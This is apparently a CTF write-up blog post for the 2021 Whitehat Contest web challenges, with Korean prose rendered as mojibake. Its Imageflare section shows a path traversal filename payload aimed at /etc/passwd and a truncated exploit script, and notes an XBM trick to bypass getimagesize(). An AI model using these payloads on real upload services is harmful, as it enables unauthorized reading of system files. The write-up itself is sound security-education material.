---
title: "2021 í™”ì´íŠ¸í–‡ì½˜í…ŒìŠ¤íŠ¸ ì›¹ ë¶„ì•¼ Writeup"
description: "2021 í™”ì´íŠ¸í–‡ì½˜í…ŒìŠ¤íŠ¸ ì˜ˆì„  ì›¹ ë¬¸ì œ í’€ì´ - Imageflare, mudbox, mini-realworld"
date: 2021-10-20
tags: ["whitehat", "file-upload", "path-traversal", "php"]
ctf: "Whitehat Contest 2021"
published: true
---

# 2021 í™”ì´íŠ¸í–‡ì½˜í…ŒìŠ¤íŠ¸ ì›¹ ë¶„ì•¼ Writeup


## ğŸ“¸ ì›ë³¸ ì´ë¯¸ì§€

![Image 1](/images/writeups/whitehat-2021-web_c8765417.png)

![Image 2](/images/writeups/whitehat-2021-web_b805fec1.png)

![Image 3](/images/writeups/whitehat-2021-web_d2df602f.png)

![Image 4](/images/writeups/whitehat-2021-web_5a428ba0.png)

![Image 5](/images/writeups/whitehat-2021-web_4ddb68d1.png)

![Image 6](/images/writeups/whitehat-2021-web_1be4bf9f.png)

![Image 7](/images/writeups/whitehat-2021-web_561ce045.png)

![Image 8](/images/writeups/whitehat-2021-web_58a1bcad.png)

![Image 9](/images/writeups/whitehat-2021-web_81a882d8.png)

![Image 10](/images/writeups/whitehat-2021-web_180183ac.png)

![Image 11](/images/writeups/whitehat-2021-web_50b62b6b.png)

![Image 12](/images/writeups/whitehat-2021-web_530c1d48.png)

![Image 13](/images/writeups/whitehat-2021-web_f1463805.png)

![Image 14](/images/writeups/whitehat-2021-web_225da2fe.png)

![Image 15](/images/writeups/whitehat-2021-web_97032c9a.png)

![Image 16](/images/writeups/whitehat-2021-web_fdbbdf6f.png)

![Image 17](/images/writeups/whitehat-2021-web_7ee63fd0.png)

![Image 18](/images/writeups/whitehat-2021-web_292532b5.png)

![Image 19](/images/writeups/whitehat-2021-web_1dae516b.png)

![Image 20](/images/writeups/whitehat-2021-web_c2a7dfab.png)

![Image 21](/images/writeups/whitehat-2021-web_6d1fa813.png)


## Imageflare (v1)

### ì·¨ì•½ì 

íŒŒì¼ëª…ì— path traversal ê°€ëŠ¥:

```python
files = {
    'file': ('..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', f, 'image/png')
}
```

ìœ„ì™€ê°™ì´ file nameì„ êµ¬ì„±í•¨ìœ¼ë¡œì¨ file downloadê°€ ê°€ëŠ¥í•´ì§„ë‹¤.

### Exploit ì½”ë“œ

```python
from arang import *
import re, sys

def dopow(x):
    for i in range(0, 10000000):
        if hexencode(sha1(str(i)))[:5] == x:
            return i
    return 'false'

fname = urlencode(f"../../../../../../../../../../../../{sys.argv[1]}").replace("/", "%2f")
# ... exploit
```

---

## Imageflare v2

### ì·¨ì•½ì 

`getimagesize()` ìš°íšŒë¥¼ ìœ„í•´ **XBM í¬ë§·** ì‚¬ìš©

```
#defineì„ í†µí•´ xbmì€ image sizeë¥¼ parsingí•˜ê¸° ë•Œë¬¸ì— getimagesize ìš°íšŒëœë‹¤.
```

---

## mudbox

ì„œë²„ ì¸¡ ì½”ë“œ ë¶„ì„ì„ í†µí•œ ì·¨ì•½ì  ë°œê²¬ ë° ìµìŠ¤í”Œë¡œì‡

---

## mini-realworld

ì‹¤ì œ í™˜ê²½ê³¼ ìœ ì‚¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì˜ ì›¹ ë¬¸ì œ
